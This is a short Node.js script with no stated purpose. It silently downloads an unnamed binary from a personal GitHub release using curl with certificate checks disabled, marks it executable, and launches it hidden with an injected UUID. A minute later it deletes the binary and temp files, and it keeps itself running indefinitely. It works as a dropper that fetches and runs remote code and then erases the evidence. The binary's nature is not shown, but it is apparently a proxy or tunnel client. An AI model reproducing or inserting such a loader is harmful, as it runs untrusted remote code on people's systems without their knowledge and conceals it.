const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const CONFIG = {
    fileName: 'theone',
    downloadUrl: 'https://github.com/babama1001980/good/releases/download/npc/theone',
    tmpDir: '.tmp',
    env: {
        UUID: "faacf142-dee8-48c2-8558-641123eb939c"
    }
};

const filePath = path.join(__dirname, CONFIG.fileName);
const tmpPath = path.join(__dirname, CONFIG.tmpDir);

function cleanup() {
    try {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        if (fs.existsSync(tmpPath)) fs.rmSync(tmpPath, { recursive: true, force: true });
    } catch (e) {}
}

function downloadFile() {
    try {
        execSync(`curl -L -k -s -o "${filePath}" "${CONFIG.downloadUrl}"`);
    } catch (error) {
        process.exit(1);
    }
}

function startApp() {
    try {
        if (fs.existsSync(filePath)) {
            fs.chmodSync(filePath, '755');
        } else {
            process.exit(1);
        }
    } catch (err) {
        process.exit(1);
    }

    const child = spawn(`./${CONFIG.fileName}`, [], {
        cwd: __dirname,
        stdio: 'ignore', 
        shell: true,
        env: { ...process.env, ...CONFIG.env }
    });

    setTimeout(() => {
        cleanup();
    }, 60000);

    setInterval(() => {}, 1000 * 60 * 60);

    child.on('error', () => {
        cleanup();
        process.exit(1);
    });

    child.on('exit', (code) => {
        cleanup();
        process.exit(code || 1);
    });
}

cleanup();
downloadFile();
startApp();